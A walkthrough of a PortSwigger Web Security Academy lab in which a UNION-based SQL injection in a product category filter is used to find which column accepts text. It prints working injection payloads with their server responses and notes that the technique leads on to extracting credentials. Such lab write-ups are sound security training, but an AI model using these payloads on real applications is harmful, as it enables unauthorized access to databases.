# PortSwigger — SQL Injection UNION Attack, Finding a Column Containing Text

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The query returns 3 columns (determined in the previous lab). By substituting the target string `hDvJ8O` into each NULL position one at a time, **column 2** is identified as string-compatible — the value appears in the page response, solving the lab.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — UNION Attacks**
- Goal: Identify which column accepts string data by injecting a target value (`hDvJ8O`)
- Column count: **3** (established from previous lab)

---

## Recon

### Step 1 — Column count (known from previous lab)

The query returns **3 columns**, confirmed via:

```
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
```

**Response: 200 OK** ✅

---

## Exploitation

### Step 2 — Identify string-compatible columns

Not all columns accept string data — some may be typed as `INTEGER` or `BOOLEAN`, causing a type mismatch error if a string is injected. The approach is to replace each `NULL` with the target string one at a time until the page returns successfully with the value visible.

**Test column 1:**
```
/filter?category=Accessories' UNION SELECT 'hDvJ8O',NULL,NULL--
```
➡ **500 Internal Server Error** — column 1 does not accept strings.

**Test column 2:**
```
/filter?category=Accessories' UNION SELECT NULL,'hDvJ8O',NULL--
```
➡ **200 OK** — `hDvJ8O` appears in the page ✅

### Final Payload

```
/filter?category=Accessories' UNION SELECT NULL,'hDvJ8O',NULL--
```

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
→ 200 OK → 3 columns confirmed (from previous lab)
        ↓
' UNION SELECT 'hDvJ8O',NULL,NULL-- → 500 error → column 1 not string-compatible
        ↓
' UNION SELECT NULL,'hDvJ8O',NULL-- → 200 OK → hDvJ8O visible in response ✅
        ↓
LAB SOLVED ✅
```

---

## Why Test Each Position?

SQL enforces type compatibility in UNION queries. If the original query returns `INTEGER, VARCHAR, INTEGER`, injecting a string into column 1 or 3 will cause a type mismatch error. Testing position by position is the only reliable way to identify which columns can carry string data — essential for extracting usernames, passwords, or any text-based value in subsequent attacks.

---

## Key Takeaways

- After determining column count, the **next mandatory step** is always identifying string-compatible columns
- Replace one `NULL` at a time with a known string value and observe the response
- A **200 OK** with the value visible in the page confirms a string-compatible column
- In this lab: column count = **3**, string-compatible column = **column 2**
- This technique directly enables data extraction in more advanced UNION attacks (credentials, schema enumeration, etc.)

---

## References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

